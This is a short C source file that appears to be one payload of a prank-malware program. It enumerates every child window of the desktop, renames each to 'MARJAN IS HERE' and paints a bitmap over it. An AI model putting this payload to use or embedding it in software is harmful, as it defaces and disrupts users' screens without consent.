#include "MBYTE.h"

BOOL CALLBACK EnumRES (HWND hwnd, LPARAM lParam);

PAYLOAD (draw_marjan) {
	HEAD;
	
	EnumChildWindows (DESKTOP, &EnumRES, NULL);
	return;
}

BOOL CALLBACK EnumRES (HWND hwnd, LPARAM lParam) {
	SetWindowText (hwnd, "MARJAN IS HERE");
	HDC hdc = GetDC (hwnd);
	COOR a;
	COOR b = get_hwnd_size (hwnd);
	a.X = 0;
	a.Y = 0;
	LoadImgB ("marjan.bmp", hdc, b, a);
	return TRUE;
}
